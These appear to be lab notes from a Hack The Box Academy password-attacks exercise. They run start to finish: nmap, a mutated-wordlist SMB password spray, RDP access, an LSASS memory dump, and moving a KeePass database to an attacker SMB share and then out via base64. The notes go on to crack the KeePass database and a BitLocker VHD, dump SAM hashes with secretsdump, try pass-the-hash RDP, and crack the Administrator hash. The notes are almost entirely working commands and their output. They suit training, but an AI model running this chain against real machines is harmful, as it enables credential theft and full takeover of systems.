## LAB

nmap -sV -oA nmap $TARGET --stats-every=5s

PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
unzip Password-Attacks.zip
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

crackmapexec smb $TARGET -u Johanna -p mut_password.list --shares

SMB         10.129.226.236  445    WINSRV           [+] WINSRV\Johanna:1231234! 
SMB         10.129.226.236  445    WINSRV           [+] Enumerated shares
SMB         10.129.226.236  445    WINSRV           Share           Permissions     Remark
SMB         10.129.226.236  445    WINSRV           -----           -----------     ------
SMB         10.129.226.236  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.226.236  445    WINSRV           C$                              Default share
SMB         10.129.226.236  445    WINSRV           david                           
SMB         10.129.226.236  445    WINSRV           IPC$            READ            Remote IPC


smbclient -U Johanna \\\\$TARGET\\ADMIN$
1231234!

smbclient -U Johanna \\\\$TARGET\\david
Password for [WORKGROUP\Johanna]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smbclient -U Johanna \\\\$TARGET\\IPC$
Password for [WORKGROUP\Johanna]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*

xfreerdp /v:$TARGET /u:Johanna /p:1231234!
-> OK

Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

-> C:\Users\loggedonusersdirectory\AppData\Local\Temp\lsass.DMP

C:\Users\johanna>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
AppData\Local\Google\Chrome\User Data\ZxcvbnData\1\passwords.txt
AppData\Roaming\KeePass\KeePass.config.xml

<Path>..\..\Users\johanna\Documents\Logins.kdbx</Path>

C:\Users\johanna\AppData\Local\Google\Chrome\User Data\ZxcvbnData>explorer .



sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/

C:\Users\johanna\Documents>move Logins.kdbx \\10.10.15.139\CompData
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.

C:\Users\johanna\Documents>vssadmin CREATE SHADOW /For=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Error: You don't have the correct permissions to run this command.  Please run this utility from a command
window that has elevated administrator privileges.


net user

User accounts for \\WINSRV

-------------------------------------------------------------------------------
Administrator            david                    DefaultAccount
Guest                    johanna                  sshd
WDAGUtilityAccount
The command completed successfully.


pypykatz lsa minidump /home/lsass.dmp

sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt


PS C:\Users\johanna\Documents> Get-FileHash .\Logins.kdbx
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          902F5297ECF8CB087530BCB3AD3F3207E119E66C4EEEBFE6A26830F0D8D1FD3C       C:\Users\johanna\Documents\Lo...

[Convert]::ToBase64String((Get-Content -path "C:\Users\johanna\Documents\Logins.kdbx" -Encoding byte))

echo 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 | base64 -d > Logins.kdbx

sha256sum Logins.kdbx 
902f5297ecf8cb087530bcb3ad3f3207e119e66c4eeebfe6a26830f0d8d1fd3c  Logins.kdbx


locate *2john*

/usr/bin/keepass2john Logins.kdbx > kdbx.hash
cat kdbx.hash
john --wordlist=mut_password.list kdbx.hash
john kdbx.hash --show
Logins:Qwerty7!
1 password hash cracked, 0 left

david
gRzX7YbeTcDG7

xfreerdp /v:$TARGET /u:david /p:gRzX7YbeTcDG7
xfreerdp /u:david /p:"gRzX7YbeTcDG7" /v:$TARGET

smbclient -U david \\\\$TARGET\\david
gRzX7YbeTcDG7

smb: \> get Backup.vhd 

/usr/bin/bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
wget https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases/rockyou-75.txt > rockyou.txt
hashcat -m 22100 backup.hash mut_password.list -o backup.cracked
cat backup.cracked 
$bitlocker$0$16$60d83def3e335699830cc42793dae6e5$1048576$12$80b20a04341fd80103000000$60$ae149c9c17975483390d2afb7ff75c3e3380733976fa7d02bb29caebece6076c3c29096fc341a916c79b0db656a1f28e9f186e8b201c38653f64443a:123456789!

cat /etc/os-release
ID_LIKE=debian

apt-get install qemu-utils
sudo su
modprobe nbd

qemu-nbd -c /dev/nbd0 Backup.vhd

WARNING: Image format was not specified for 'Backup.vhd' and probing guessed raw.
         Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted.
         Specify the 'raw' format explicitly to remove the restrictions.

lsblk
NAME     MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
nbd0      43:0    0  130M  0 disk 
├─nbd0p1  43:1    0   16M  0 part 
└─nbd0p2  43:2    0  112M  0 part 
vda      254:0    0   50G  0 disk 
├─vda1   254:1    0   46G  0 part /
├─vda2   254:2    0    1M  0 part 
└─vda3   254:3    0  3.9G  0 part [SWAP]

cryptsetup bitlkOpen /dev/nbd0p2 my_label
123456789!

mkdir /mnt/mydrive
mount /dev/mapper/my_label /mnt/mydrive

/mnt/mydrive/
┌─[root@htb-6hrqf9i8pg]─[/mnt/mydrive]
└──╼ #tree .
.
├── $RECYCLE.BIN
│   ├── S-1-5-21-2288469977-2371064354-2971934342-1010
│   │   └── desktop.ini
│   └── S-1-5-21-2288469977-2371064354-2971934342-500
│       └── desktop.ini
├── SAM
├── SYSTEM
└── System Volume Information
    ├── FVE2.{24e6f0ae-6a00-4f73-984b-75ce9942852d}
    ├── FVE2.{aff97bac-a69b-45da-aba1-2cfbce434750}.1
    ├── FVE2.{aff97bac-a69b-45da-aba1-2cfbce434750}.2
    ├── FVE2.{da392a22-cae0-4f0f-9a30-b8830385d046}
    ├── FVE2.{e40ad34d-dae9-4bc7-95bd-b16218c10f72}.1
    ├── FVE2.{e40ad34d-dae9-4bc7-95bd-b16218c10f72}.2
    ├── FVE2.{e40ad34d-dae9-4bc7-95bd-b16218c10f72}.3
    └── WPSettings.dat

umount /mnt/mydrive
cryptsetup bitlkClose my_label

cp SAM SYSTEM /home/htb-ac-786011

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::

e53d4d912d96874e83429886c7bf22a1

xfreerdp  /v:$TARGET /u:Administrator /pth:e53d4d912d96874e83429886c7bf22a1

blank passwords aren't allowed

sudo hashcat -m 1000 e53d4d912d96874e83429886c7bf22a1 mut_password.list

e53d4d912d96874e83429886c7bf22a1:Liverp00l8!

xfreerdp /v:$TARGET /u:Administrator /p:Liverp00l8!

HTB{PWcr4ck1ngokokok}